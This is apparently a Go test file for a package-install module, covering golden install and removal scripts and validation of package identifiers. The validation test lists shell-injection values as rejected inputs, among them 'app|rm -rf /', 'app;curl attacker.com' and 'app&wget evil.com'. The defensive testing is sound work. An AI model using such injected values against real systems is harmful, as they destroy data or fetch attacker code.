package file

import (
	"flag"
	"io"
	"os"
	"path/filepath"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

var update = flag.Bool("update", false, "update the golden files of this test")

func TestMain(m *testing.M) {
	flag.Parse()
	os.Exit(m.Run())
}

// Note: to update the goldens, delete testdata/scripts/* and run the tests with `-update`:
//
// go test ./pkg/file/... -update
func TestGetInstallAndRemoveScript(t *testing.T) {
	t.Parallel()
	scriptsByType := map[string]map[string]string{
		"msi": {
			"install":   "./scripts/install_msi.ps1",
			"remove":    "./scripts/remove_msi.ps1",
			"uninstall": "./scripts/uninstall_msi.ps1",
		},
		"pkg": {
			"install":   "./scripts/install_pkg.sh",
			"remove":    "./scripts/remove_pkg.sh",
			"uninstall": "./scripts/uninstall_pkg.sh",
		},
		"deb": {
			"install":   "./scripts/install_deb.sh",
			"remove":    "./scripts/remove_deb.sh",
			"uninstall": "./scripts/uninstall_deb.sh",
		},
		"rpm": {
			"install":   "./scripts/install_rpm.sh",
			"remove":    "./scripts/remove_rpm.sh",
			"uninstall": "./scripts/uninstall_rpm.sh",
		},
		"exe": {
			"install":   "",
			"remove":    "./scripts/remove_exe.ps1",
			"uninstall": "",
		},
	}

	for itype, scripts := range scriptsByType {
		gotScript := GetInstallScript(itype)
		assertGoldenMatches(t, scripts["install"], gotScript, *update)

		gotScript = GetRemoveScript(itype)
		assertGoldenMatches(t, scripts["remove"], gotScript, *update)

		gotScript = GetUninstallScript(itype)
		assertGoldenMatches(t, scripts["uninstall"], gotScript, *update)
	}
}

func TestValidatePackageIdentifiers(t *testing.T) {
	t.Parallel()

	t.Run("valid identifiers", func(t *testing.T) {
		validIDs := []string{
			"com.example.app",
			"ruby",
			"org.mozilla.firefox",
			"{12345-ABCDE-67890}",
			"Microsoft.VisualStudioCode",
			"package/name",
			"my-app_v2.0+build1",
			"app:latest",
			"name@version",
			"path/to/pkg",
			"a~b",
			"comma,separated",
			"with spaces",
		}
		require.NoError(t, ValidatePackageIdentifiers(validIDs, ""))
		require.NoError(t, ValidatePackageIdentifiers(nil, "{UPGRADE-CODE-123}"))
		require.NoError(t, ValidatePackageIdentifiers(validIDs, "{UPGRADE-CODE-123}"))
	})

	t.Run("empty inputs", func(t *testing.T) {
		require.NoError(t, ValidatePackageIdentifiers(nil, ""))
		require.NoError(t, ValidatePackageIdentifiers([]string{}, ""))
	})

	t.Run("malicious package IDs", func(t *testing.T) {
		maliciousIDs := []struct {
			name string
			id   string
		}{
			{"command substitution", "com.app$(id)"},
			{"backtick execution", "app`id`"},
			{"pipe injection", "app|rm -rf /"},
			{"semicolon injection", "app;curl attacker.com"},
			{"ampersand injection", "app&wget evil.com"},
			{"redirect output", "app>file"},
			{"redirect input", "app<file"},
			{"single quote", "app'break"},
			{"double quote", `app"break`},
			{"backslash", `app\n`},
			{"newline", "app\nid"},
			{"exclamation", "app!cmd"},
		}
		for _, tc := range maliciousIDs {
			t.Run(tc.name, func(t *testing.T) {
				err := ValidatePackageIdentifiers([]string{tc.id}, "")
				require.Error(t, err)
				assert.Contains(t, err.Error(), "contains invalid characters")
			})
		}
	})

	t.Run("malicious upgrade code", func(t *testing.T) {
		err := ValidatePackageIdentifiers(nil, "code$(id)")
		require.Error(t, err)
		assert.Contains(t, err.Error(), "upgrade code")
		assert.Contains(t, err.Error(), "contains invalid characters")
	})
}

func assertGoldenMatches(t *testing.T, goldenFile string, actual string, update bool) {
	t.Helper()
	if goldenFile == "" {
		require.Empty(t, actual)
		return
	}

	goldenPath := filepath.Join("testdata", goldenFile+".golden")

	f, err := os.OpenFile(goldenPath, os.O_RDWR|os.O_CREATE, 0o644) // nolint:gosec // G302
	require.NoError(t, err)
	defer f.Close()

	if update {
		_, err := f.WriteString(actual)
		require.NoError(t, err)
		return
	}

	content, err := io.ReadAll(f)
	require.NoError(t, err)
	assert.Equal(t, string(content), actual)
}
